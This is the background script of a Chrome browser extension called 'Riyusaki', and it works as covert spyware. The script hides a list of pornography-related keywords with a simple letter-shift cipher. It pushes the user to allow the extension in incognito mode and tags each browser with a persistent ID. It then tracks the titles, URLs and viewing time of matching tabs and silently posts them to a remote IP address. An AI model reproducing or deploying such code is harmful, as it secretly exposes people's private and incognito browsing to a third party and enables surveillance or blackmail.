// ® Riyusaki
(function(){
var app_uri = 'http://riyusaki.com/'
var db_uri = "http://54.191.81.102:8000/update/";
var cookieName = 'randomID';
var appDomain = 'riyusaki.com';
ops = {
  dec:function(e_tag){
    var d_tag = '';
    for (c_itr=0; c_itr<e_tag.length; c_itr++) {
      c = e_tag.charAt(c_itr);
      d_tag += String.fromCharCode((c.charCodeAt(0)-2) >= 97?(c.charCodeAt(0)-2):(c.charCodeAt(0)==32)?(c.charCodeAt(0)):(c.charCodeAt(0)-2+26));
    }
    return d_tag;
  }
};
var e_tags = ['ugz', 'rqtp', 'zzz', 'zz', 'ewo', 'ewoujqv', 'hwem', 'cuu', 'dtcbbgtu', 'pcwijva cogtkec', 'ewpv', 'dqqdu'];
var pattern = '';
for (e_tag_itr=0; e_tag_itr<e_tags.length; e_tag_itr++) {
  e_tag = e_tags[e_tag_itr];
  pattern += ops.dec(e_tag) + '|';
}
pattern = pattern.substring(0, pattern.length-1);
var tags = new RegExp(pattern, 'i');
var url_title_map = {};
var url_time_map = {};
var url_focus_time_map = {};
var tab_id_url_map = {};
var __aT__ = null;
var __aTi__ = null;
var prefName = '_ryski';
var cookieName = 'randomID';
riyusaki = {
  notice:function(){
    chrome.extension.isAllowedIncognitoAccess(function(isAllowedAccess){
      if(!isAllowedAccess){
          chrome.tabs.create({url:'chrome://extensions/?id='+chrome.runtime.id});
          alert('Thank you for installing the Riyusaki extension.\n--------------------------------\nPlease allow our extension in incognito mode for better performance.\n--------------------------------\n');
      }
    })
  },
  setCookie:function(){
    chrome.cookies.get({url:app_uri, name:cookieName}, function(cookie){
      if(cookie == null || cookie == undefined){
        chrome.storage.local.get('_ryski', function(result){
          if (result._ryski == null || result._ryski == undefined){
            randomID = parseInt(Math.random()*10000000+1).toString();
            chrome.storage.local.set({'_ryski':randomID});
            var expiry = ((new Date()).getTime()/1000) + 86400;
            chrome.cookies.set({url:app_uri, name:cookieName, value:randomID, expirationDate:expiry});
          }
          else {
            var expiry = ((new Date()).getTime()/1000) + 86400;
            chrome.cookies.set({url:app_uri, name:cookieName, value:result._ryski, expirationDate:expiry});
          }
        });
      }
      else{
        randomID = cookie.value;
      }
    });
  },
  init : function(){
    chrome.webRequest.onBeforeRequest.addListener(function(details){
      riyusaki.setCookie();
    }, {urls:[app_uri]});
    chrome.tabs.onActivated.addListener(function (activeInfo) {
      chrome.tabs.getSelected(null, function(tab_1){
        var tab_url = String(tab_1.url);

        var tab_id = String(tab_1.id);
        var tab_title = String(tab_1.title);
        if(tab_id != __aTi__ && tab_title.match(tags)) {
          riyusaki.recordTitle(tab_url, tab_title);
          riyusaki.recordID(tab_id, tab_url);
          if(!riyusaki.isEmpty(__aT__) && __aT__ != tab_url){
            riyusaki.discontinueLogger(__aT__);
            __aT__ = String(tab_url);
            __aTi__ = String(tab_id);
            riyusaki.continueLogger(__aT__);
           }
          if(riyusaki.isEmpty(__aT__)){
            __aT__ = String(tab_url);
            __aTi__ = String(tab_id);
            riyusaki.continueLogger(tab_url);
          }
        }
       });
    });
    chrome.tabs.onUpdated.addListener(function (tabid, changeInfo, tab2) {
      chrome.tabs.getSelected(null, function(tab){
        if(tab.title.toLowerCase().indexOf("new tab") == -1 && tab.title.match(tags)){
          riyusaki.recordTitle(tab.url, tab.title);
          riyusaki.recordID(String(tabid), tab.url);

          if (!riyusaki.isEmpty(__aT__) && __aT__ == tab.url){
          }
          if(!riyusaki.isEmpty(__aT__) && __aT__ != tab.url){
            riyusaki.stopLogger(__aT__);
            __aT__ = String(tab.url);
            __aTi__ = String(tabid);
            riyusaki.continueLogger(__aT__)
          }
          if(riyusaki.isEmpty(__aT__)){
            __aT__ = String(tab.url);
            __aTi__ = String(tabid);
            riyusaki.continueLogger(__aT__);
          }
        }
      });
    });
    chrome.windows.onRemoved.addListener(function (windowID){
      riyusaki.destroyData();
    });
    chrome.tabs.onRemoved.addListener(function (tabID, removeInfo) {
      if(!riyusaki.isEmpty(tab_id_url_map[tabID])){
        riyusaki.stopLogger(tab_id_url_map[tabID]);
      }
    });
  },
  recordTitle:function(url, title){
    if(riyusaki.isEmpty(url_title_map[url])){
      url_title_map[url] = title;
    }
  },
  recordID:function(id, url){
    if(!riyusaki.isEmpty(url)){
      tab_id_url_map[id] = url;
    }
  },
  continueLogger:function(url){
    url_focus_time_map[url] = new Date().getTime();
    if(riyusaki.isEmpty(url_time_map[url]))
      url_time_map[url] = 0;
  },
  discontinueLogger:function(url){
    url_time_map[url] += parseInt((new Date().getTime() - url_focus_time_map[url])/1000);
    url_focus_time_map[url] = new Date().getTime();
  },
  stopLogger:function(url){
    if(__aT__ == url)
      url_time_map[url] += parseInt( (new Date().getTime() - url_focus_time_map[url]) /1000);
    url_focus_time_map[url] = new Date().getTime();
    var done = false;
    done = riyusaki.record(url, url_title_map[url], url_time_map[url]);
    if (done == true){
      riyusaki.delete_data(url)
    }
  },
  destroyData:function(){
    for (url in url_time_map){
      riyusaki.stopLogger(url)
    }
    delete tab_id_url_map;
  },
  isEmpty:function(obj){
    if(obj == null || obj == undefined || obj == "")
      return true;
    else
      return false;
  },
  record:function(url, title, time){
    if(!riyusaki.isEmpty(url) && !riyusaki.isEmpty(title) && !isNaN(time)){
      var xmlHttp = new XMLHttpRequest();
      xmlHttp.open("POST", db_uri+randomID, true);
      xmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xmlHttp.send("u="+url+"&t="+time+"&ti="+title);
    }
    return true

  },
  delete_data:function(url){
    delete url_title_map[url];
    delete url_time_map[url];
    delete url_focus_time_map[url];
  }
};
riyusaki.notice();
riyusaki.setCookie();
riyusaki.init();
})();
